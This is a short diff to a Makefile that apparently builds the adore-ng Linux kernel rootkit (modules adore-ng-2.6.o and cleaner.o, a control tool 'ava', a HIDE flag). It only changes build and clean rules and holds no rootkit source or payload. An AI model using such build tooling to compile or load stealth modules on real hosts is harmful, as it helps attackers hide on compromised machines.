@@ -28,8 +28,13 @@ EXTRA_CFLAGS+=-DHIDE
 KERNEL_SOURCE=/usr/src/linux-headers-2.6.38-8-generic
 
 obj-m := adore-ng-2.6.o cleaner.o
-#obj-m := cleaner.o
 default: ava adore symsed
+
+#obj-m += adore-ng-2.6.o
+#obj-m += cleaner.o
+#all:
+#	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
 
 adore:
 	make -C ${KERNEL_SOURCE} SUBDIRS=`pwd` modules
@@ -39,7 +44,6 @@ ava: ava.c libinvisible.c
 
 symsed: symsed.c
 	$(CC) -O2 symsed.c -o symsed
-
 clean:
-	rm -f core ava *.o *.ko
-
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	rm -f core ava *.o* *.ko*
